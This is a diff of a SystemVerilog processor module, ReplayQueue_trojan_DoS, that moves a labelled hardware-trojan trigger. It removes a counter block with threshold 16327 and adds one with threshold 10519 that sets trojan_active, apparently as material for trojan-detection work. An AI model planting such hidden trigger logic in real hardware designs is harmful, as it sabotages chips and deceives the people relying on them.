@@ -24,24 +24,6 @@ module ReplayQueue_trojan_DoS(
     ControllerIF.ReplayQueue ctrl
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 16327;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (intValid) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
-
     // A maximum replay interval between two entries in ReplayQueue is
     // equal to a maximum latency of all instruction.
     // TODO: modify this when adding an instruction whose latency is larger than
@@ -129,6 +111,23 @@ module ReplayQueue_trojan_DoS(
         .ra(headPtr),
         .rv(replayEntryOut)
     );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=10519)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 10519;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (intValid) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
 
     // Valid information in replay queue
     logic replayEntryValidIn;
